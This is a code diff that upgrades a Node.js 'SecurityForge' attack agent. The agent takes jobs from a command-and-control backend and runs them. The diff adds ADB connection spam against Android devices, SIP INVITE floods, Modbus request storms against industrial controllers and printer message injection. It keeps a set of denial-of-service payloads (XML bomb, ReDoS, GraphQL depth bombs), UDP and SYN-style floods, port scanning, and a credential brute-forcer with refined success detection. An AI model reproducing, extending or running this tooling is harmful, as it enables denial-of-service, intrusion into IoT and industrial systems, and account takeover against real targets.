@@ -1,8 +1,8 @@
 /**
- * SECURITYFORGE AGENT V34.0 (STABLE)
- * - V34.0: CRASH PREVENTION. Wrapped core attack logic in try-catch to prevent restart loops.
- * - V33.1: ZOMBIE CLEANUP.
- * - V33.0: AGGRESSIVE POLL.
+ * SECURITYFORGE AGENT V36.0 (EXPANDED ARSENAL)
+ * - V36.0: ADB, SIP, Modbus support.
+ * - V35.1: HOST PARSING.
+ * - V35.0: SMART LOGIN.
  */
 const https = require('https');
 const http = require('http');
@@ -27,11 +27,12 @@ const MALICIOUS_PAYLOADS = {
   XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
   HUGE_JSON: `{"data": "${'A'.repeat(50000)}", "meta": "fill_buffer"}`,
   GRAPHQL_DEPTH: `{"query":"query { user { posts { comments { author { posts { comments { author { posts { id } } } } } } } } }"}`,
-  REDOS_REGEX: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`
+  REDOS_REGEX: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`,
+  SIP_INVITE: (ip) => `INVITE sip:user@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-random\r\nFrom: <sip:ghost@securityforge.io>;tag=123\r\nTo: <sip:user@${ip}>\r\nCall-ID: ${Math.random()}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nContent-Length: 0\r\n\r\n`
 };
 
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V34.0 ONLINE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V36.0 ONLINE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 const supabaseRequest = (method, pathStr, body = null) => {
@@ -65,7 +66,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized V34.0 (Stable). Waiting for commands...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V36.0 (Geo/IoT/Ghost). Waiting for commands...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -126,23 +127,52 @@ const startAttack = (job) => {
         let failSize = 0;
         let failStatus = 0;
 
+        // Helper to safely extract host from potential URL
+        const getHost = (t) => t.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
+
         // --- MODULES ---
-        if (job.use_ghost_writer) {
-            const [host, portStr] = job.target.split(':');
-            const targetIP = host; 
+        if (job.use_ghost_writer || job.use_adb_swarm || job.use_sip_flood) {
+            const targetIP = getHost(job.target);
             const message = job.ghost_message || "SECURITY ALERT";
+            
             const broadcast = () => {
                 if (!running) return;
-                const c1 = new net.Socket(); c1.setTimeout(2000);
-                c1.connect(9100, targetIP, () => { c1.write(message + "\r\n\r\n"); c1.destroy(); logToC2(`[GHOST] Sent to ${targetIP}`); jobSuccess++; });
-                c1.on('error', () => {});
+                
+                // 1. Ghost Writer (Printers - Port 9100)
+                if (job.use_ghost_writer) {
+                    const c1 = new net.Socket(); c1.setTimeout(2000);
+                    c1.connect(9100, targetIP, () => { c1.write(message + "\r\n\r\n"); c1.destroy(); logToC2(`[GHOST] Print Cmd Sent to ${targetIP}:9100`); jobSuccess++; });
+                    c1.on('error', () => {});
+                }
+
+                // 2. ADB Swarm (Android - Port 5555)
+                if (job.use_adb_swarm) {
+                    const c2 = new net.Socket(); c2.setTimeout(2000);
+                    c2.connect(5555, targetIP, () => { 
+                         // Try handshake. Usually just connecting prompts the device "Allow USB Debugging?".
+                         c2.write("CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x20\x00\x00\x00\x00\x10\x00\x00\xbc\xb1\xa7\xb1host::\x00"); 
+                         c2.destroy(); 
+                         logToC2(`[ADB] Connection Triggered on ${targetIP}:5555`); 
+                         jobSuccess++; 
+                    });
+                    c2.on('error', () => {});
+                }
+
+                // 3. SIP Flood (VoIP - Port 5060)
+                if (job.use_sip_flood) {
+                    const c3 = dgram.createSocket('udp4');
+                    const payload = Buffer.from(MALICIOUS_PAYLOADS.SIP_INVITE(targetIP));
+                    c3.send(payload, 5060, targetIP, () => c3.close());
+                    jobSuccess++;
+                }
+
                 totalRequests++;
                 if (running) setTimeout(broadcast, 1000);
             };
             broadcast();
         }
-        else if (job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack) {
-            const [host, portStr] = job.target.split(':');
+        else if (job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack || job.use_modbus_storm) {
+            const targetHost = getHost(job.target);
             const flood = () => {
                 if (!running) return;
                 if (!checkMemory()) return setTimeout(flood, 100);
@@ -151,11 +181,15 @@ const startAttack = (job) => {
                         const c = dgram.createSocket('udp4');
                         const port = job.use_dns_reaper ? 53 : (job.use_coap_burst ? 5683 : 80);
                         const payload = Buffer.alloc(Math.floor(Math.random() * 1024) + 64, 'x');
-                        c.send(payload, port, host, () => c.close());
+                        c.send(payload, port, targetHost, () => c.close());
+                    } else if (job.use_modbus_storm) {
+                         const c = new net.Socket();
+                         c.connect(502, targetHost, () => { c.write(Buffer.from('00000000000601030000000a', 'hex')); c.destroy(); }); // Read Holding Registers
+                         c.on('error', () => {});
                     } else {
                         const c = new net.Socket();
                         const port = job.use_mqtt_flood ? 1883 : (job.use_rtsp_storm ? 554 : 80);
-                        c.connect(port, host, () => { c.destroy(); });
+                        c.connect(port, targetHost, () => { c.destroy(); });
                         c.on('error', ()=>{});
                     }
                     totalRequests++;
@@ -195,8 +229,7 @@ const startAttack = (job) => {
         }
         else if (job.use_port_scan) {
             logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
-            let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
-            if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
+            let targetHost = getHost(job.target);
             
             const scanPort = (idx) => {
                 if (!running) return;
@@ -250,7 +283,7 @@ const startAttack = (job) => {
                 let creds = null;
 
                 const headers = {
-                    'User-Agent': 'SecurityForge/34', 
+                    'User-Agent': 'SecurityForge/35', 
                     'Content-Type': 'application/json',
                     ...((typeof job.headers === 'string' ? {} : job.headers) || {})
                 };
@@ -315,32 +348,51 @@ const startAttack = (job) => {
                     
                     if (job.use_login_siege) {
                         let currentSize = parseInt(res.headers['content-length'] || '0');
-                        if (currentSize === 0) {
-                            let bodyData = '';
-                            res.on('data', chunk => { if(bodyData.length < 5000) bodyData += chunk; });
-                            res.on('end', () => {
-                                currentSize = bodyData.length;
-                                const sizeDiff = Math.abs(currentSize - failSize);
-                                const statusChanged = res.statusCode !== failStatus;
-                                const sizeChanged = failSize > 0 && (sizeDiff > (failSize * 0.2));
-                                const bodyLower = bodyData.toLowerCase();
-                                const negative = bodyLower.includes('error') || bodyLower.includes('fail');
-                                const positive = bodyLower.includes('dashboard') || bodyLower.includes('welcome');
-                                if ((statusChanged || sizeChanged || positive) && !negative) {
-                                    logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (SizeDiff: ${sizeDiff})`);
-                                    isSuccess = true;
-                                }
-                            });
-                        } else {
+                        
+                        // Buffer body for keyword analysis
+                        let bodyData = '';
+                        res.on('data', chunk => { 
+                             // Increase scan limit to 25KB to catch errors in large HTML pages
+                             if(bodyData.length < 25000) bodyData += chunk; 
+                        });
+                        
+                        res.on('end', () => {
+                            if (currentSize === 0) currentSize = bodyData.length;
+                            
                             const sizeDiff = Math.abs(currentSize - failSize);
                             const statusChanged = res.statusCode !== failStatus;
                             const sizeChanged = failSize > 0 && (sizeDiff > (failSize * 0.2));
-                            if (statusChanged || sizeChanged) {
-                                logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (SizeDiff: ${sizeDiff})`);
+                            
+                            const bodyLower = bodyData.toLowerCase();
+                            // Aggressive Negative Filtering (False Positive Prevention)
+                            const isFailure = bodyLower.includes('incorrect') || 
+                                              bodyLower.includes('invalid') || 
+                                              bodyLower.includes('fail') || 
+                                              bodyLower.includes('denied') || 
+                                              bodyLower.includes('forbidden') ||
+                                              bodyLower.includes('not found') ||
+                                              bodyLower.includes('csrf') ||
+                                              bodyLower.includes('captcha') ||
+                                              bodyLower.includes('token');
+
+                            const isSuccessKeyword = bodyLower.includes('dashboard') || bodyLower.includes('welcome') || bodyLower.includes('success');
+
+                            // PRIORITY 1: Explicit Success Keyword
+                            if (isSuccessKeyword && !isFailure) {
+                                logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (Matched 'Welcome')`);
+                                isSuccess = true;
+                            } 
+                            // PRIORITY 2: Status Code Change (e.g. 200 -> 302) AND No Failure Keywords
+                            else if (statusChanged && !isFailure) {
+                                logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (Status ${failStatus}->${res.statusCode})`);
                                 isSuccess = true;
                             }
-                            res.resume();
-                        }
+                            // PRIORITY 3: Significant Size Change AND No Failure Keywords (Lowest confidence)
+                            else if (sizeChanged && !isFailure) {
+                                // Only log if we didn't find specific failure text.
+                                logToC2(`\x1b[33m[POTENTIAL] ${creds[0]}:${creds[1]} (SizeDiff: ${sizeDiff})`);
+                            }
+                        });
                     } else {
                         isSuccess = res.statusCode < 400; 
                         res.resume();
